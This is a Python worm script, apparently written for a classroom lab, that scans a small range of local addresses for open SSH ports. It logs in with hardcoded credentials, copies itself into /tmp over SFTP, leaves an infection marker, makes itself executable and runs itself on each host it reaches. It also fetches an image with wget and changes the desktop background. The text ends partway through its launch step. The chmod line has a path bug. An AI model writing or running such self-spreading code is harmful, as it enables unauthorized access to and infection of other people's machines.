#!/usr/bin/env python
import socket
import os, re
import sys, time
import datetime
import paramiko

# Target SSH by default
target_port = 22

# New desktop background url + file name
image_url = "https://i.imgur.com/hbNtlcJ.jpg"
image_name = "hbNtlcJ.jpg"

# Username and password to test with SSH
remote_username = "cpsc"
remote_password = "cpsc"

# Handy variables
home_dir = "/home/cpsc/"
worm_name = "worm.py"

# Output formatting
offset = 4 * " "

# Place in remote system to mark it as infected
marker_file = "infected.txt"

# Specifies what ip to stop at 192.168.1.0-max_ip. Saves time in testing
max_ip = 10


hosts = ["192.168.1." + str(i) for i in range(0, max_ip)]


def get_local_ip():
	""" Gets current machine's ip, so we don't waste time scanning it """
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		sock.connect(('8.8.8.8', 1))
		local_ip = sock.getsockname()[0]
	except:
		local_ip = "127.0.0.1"
	finally:
		sock.close()

	return local_ip


def scan_port(host, port):
	""" Scans specified port for a specified host, returns 0 on success """
	exit_code = -1
	try:
		# Set up socket to connect to
		ssh_sock = socket.socket()
		ssh_sock.settimeout(20)
		# Attempt to connect
		port_status = ssh_sock.connect_ex((host, port))
		# port_status will be 0 if specified port is open
		if port_status == 0:
			exit_code = 0

	except Exception as e:
		print ("%s[!] Port %d closed or unavailable\n" % (offset, port))
		pass
	except KeyboardInterrupt as e:
		print ("%s[!] User stopped scanning host %s\n" % (offset, host))
		return -1
	finally:
		ssh_sock.close()
	return exit_code


def get_vulnerable_hosts(port):
	""" Returns a list of hosts with specified port open """
	print ("[+] Scanning for vulnerable hosts...\n")
	vulnerable_hosts = []
	current_machine = get_local_ip()

	for host in hosts:
		# Skip scanning the machine running the scipt
		if current_machine == host:
			continue
		print ("[+] Scanning %s" % (host))
		try:
			port_status = scan_port(host, port)
			if port_status == 0:
				print("%s[o] Port %d open!" % (offset, port))
				vulnerable_hosts.append(host)
		except Exception as e:
			print ("%s[!] Error scanning %s\n" %(offset, host))
			pass
		except KeyboardInterrupt as e:
			print ("%s[!] Stopped looking for hosts\n" % (offset))
			return vulnerable_hosts

	return vulnerable_hosts


def set_background():
	""" Downloads a new desktop background for remote system """	
	ls_output = os.listdir(home_dir)
		
	print (home_dir + image_name)
	if image_name not in ls_output:
		print ("%s[o] Adding background..." % (offset))
		os.system("wget " + image_url + " -O " + home_dir + image_name)
	# Now set the backround	
	print ("Setting background now...")
	os.environ["DISPLAY"] = ":0"
	#os.system("gsettings set org.gnome.desktop.background picture-uri \"file://" + home_dir + image_name+ "\"")
	os.system("gsettings set org.gnome.desktop.background draw-background false && gsettings set org.gnome.desktop.background picture-uri file:///home/cpsc/" + image_name + " && gsettings set org.gnome.desktop.background draw-background true")


if __name__ == "__main__":
	
	set_background()
	""" Main program that performs the scan """
	
	vulnerable_hosts = get_vulnerable_hosts(target_port)
	print ("\n[Scan Results]")
	print ("Vulnerable hosts: %s, \n" % (vulnerable_hosts))

	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	local_ip = get_local_ip()
	for host in sorted(vulnerable_hosts):
		print ("[+] Attempting to SSH into %s" % (host))

		# Attempt to SSH into known host
		try:
			ssh.connect(host, username=remote_username, 
					password=remote_password)
		except Exception as e:
			print ("%s[!] Bad credentials, skipping." % (offset))
			ssh.close()
			continue
		except KeyboardInterrupt as e:
			print ("%s[!] Skipping host\n" % (offset))
			ssh.close()
			continue
		
		# Try to put worm on remote system
		try:
			sftpClient = ssh.open_sftp()
			print ("%s[o] Access Granted!" % (offset))
			
			# Check if the system has already been infected
			stdin, stdout, stderr = ssh.exec_command("ls /tmp/")
			# Remove unicode encoding fom results
			results = stdout.readlines()
			results = [str(name) for name in results]
			results = [name[0:-1] for name in results]
			if marker_file in results:
				print ("%s[!] System already infected, skipping." % (offset))
				ssh.close()
				continue
			else: # Has not been infected
				print ("%s[o] Marking system..." % (offset))
				sftpClient.put(worm_name, "/tmp/" + worm_name)
				ssh.exec_command("echo " + local_ip + " >> /tmp/" + marker_file)
					
		except Exception as e:
			print ("%s[!] Error opening sftp connection. Skipping host " % (offset))
			ssh.close()
			continue
		# Try making worm file executable by all
		try:
			ssh.exec_command("chmod a+x /tmp" + worm_name)
		except Exception as e: 
			print ("%s [!]Error with chmod. Skipping host", (offset))
			ssh.close()
			continue
		# Try launching the worm from remote host
		try:
			ssh.exec_command("python /tmp/" + worm_name)
